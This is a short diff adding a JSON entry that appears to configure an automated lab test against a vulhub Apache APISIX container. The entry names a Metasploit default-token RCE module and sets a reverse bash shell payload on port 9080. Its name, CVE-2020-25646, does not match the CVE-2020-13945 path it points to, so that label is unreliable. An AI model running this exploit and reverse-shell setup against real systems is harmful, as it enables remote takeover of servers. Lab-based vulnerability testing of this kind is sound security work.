@@ -1,0 +1,11 @@
+[
+    {"name":"CVE-2020-25646",
+        "settings": {
+            "description":"Apisix HTTP token RCE",
+            "yml_file":"$VULN_PATH/vulhub/apisix/CVE-2020-13945/docker-compose.yml",
+            "target_name":"setc-apisix-1",
+            "exploit": "multi/http/apache_apisix_api_default_token_rce",
+            "exploit_options":"set PAYLOAD cmd/unix/reverse_bash;set RPORT 9080;"
+        }
+    }
+]
